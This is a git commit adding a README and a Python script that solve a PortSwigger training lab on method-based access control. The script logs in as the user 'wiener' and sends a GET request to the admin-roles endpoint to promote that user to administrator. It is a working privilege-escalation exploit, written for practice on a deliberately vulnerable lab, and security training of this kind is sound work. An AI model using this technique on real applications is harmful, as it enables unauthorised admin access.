7c549b18906200742b9f66153fe5d44fd6319a95
Iman Ali <imanali194@gmail.com>
2024-12-12 12:52:48 -0800

    Add "Method-based access control can be circumvented"

---
+++ Access Control Vulnerabilities/Method-based access control can be circumvented/README.md
@@ -0,0 +1,9 @@
+## Method-based access control can be circumvented
+### Lab Scenario
+This lab implements access controls based partly on the HTTP method of requests. You can familiarize yourself with the admin panel by logging in using the credentials `administrator:admin`.
+To solve the lab, log in using the credentials `wiener:peter` and exploit the flawed access controls to promote yourself to become an administrator.
+
+### Instructions
+To solve the lab using this script:
+1. Access the lab here: `https://portswigger.net/web-security/access-control/lab-method-based-access-control-can-be-circumvented`
+2. Run: `python3 script.py <your lab URL>`
---
+++ Access Control Vulnerabilities/Method-based access control can be circumvented/script.py
@@ -0,0 +1,53 @@
+import requests
+import sys
+
+
+
+def login(url, session):
+    response = session.post(f"{url}/login", data={"username": "wiener", "password": "peter"}, timeout=10)
+    return "Your username is: wiener" in response.text
+
+
+def upgrade_privileges(url, session):
+    response = session.get(f"{url}/admin-roles?username=wiener&action=upgrade", timeout=10)
+    return "wiener (ADMIN)" in response.text
+
+
+def main():
+    if len(sys.argv) != 2:
+        print(f"(+) Usage: python3 {sys.argv[0]} <URL>")
+        print(f"(+) Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
+        sys.exit(1)
+
+    try:
+        url = sys.argv[1].rstrip("/")
+        session = requests.Session()
+        session.mount("https://", requests.adapters.HTTPAdapter(max_retries=requests.adapters.Retry(total=3, backoff_factor=0.1)))
+
+        print("(+) Logging in...")
+        if not login(url, session):
+            print("(-) Something went wrong. Please check your URL and try again.")
+            sys.exit(1)
+
+        print("(+) Upgrading privileges...")
+        if upgrade_privileges(url, session):
+            print("(+) Successfully upgraded privileges to admin level!")
+        else:
+            print("(-) Something went wrong.")
+
+
+    except requests.exceptions.Timeout:
+        print("(-) Request timed out.")
+
+    except requests.exceptions.MissingSchema:
+        print("(-) Please enter a valid URL.")
+
+    except requests.exceptions.ConnectionError:
+        print("(-) Unable to connect to host. Please check your URL and try again.")
+
+    except KeyboardInterrupt:
+        exit(1)
+
+
+if __name__ == "__main__":
+    main()
